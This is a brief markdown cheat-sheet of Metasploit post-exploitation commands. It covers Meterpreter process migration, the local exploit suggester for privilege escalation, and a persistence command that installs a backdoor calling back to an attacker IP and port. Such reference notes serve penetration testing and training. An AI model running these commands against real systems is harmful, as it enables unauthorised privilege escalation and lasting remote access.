---
layout: default
---
<< [Home](./)

# Metasploit Index
* [Privilege Escalation](#Privilege-Escalation)
* [Persistence](#Persistence)

## Privilege Escalation<a name="Privilege-Escalation"></a>

### Migrating to process in meterpreter session.
1. List processes.
```bash
ps
```
2. Migrate.
```bash
migrate [pid]
```

### Find possible privilege escalation using exploit suggester.
1. Use
```bash
use post/multi/recon/local_exploit_suggester
```
1. Set options
```bash
set session [session_nr]
```
1. Run
```bash
run
```

### Other exploit suggesters...
* [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [Linux-Exploit-Suggester](https://github.com/mzet-/linux-exploit-suggester)

## Persistence<a name="Persistence"></a>

### In meterpreter session:
```bash
run persistence -{U | X} -i [interval] -p [attacker_port] -r [attacker_ip]
```
Example:
```bash
run persistence -X -i 10 -p 4445 -r 192.168.1.10
```
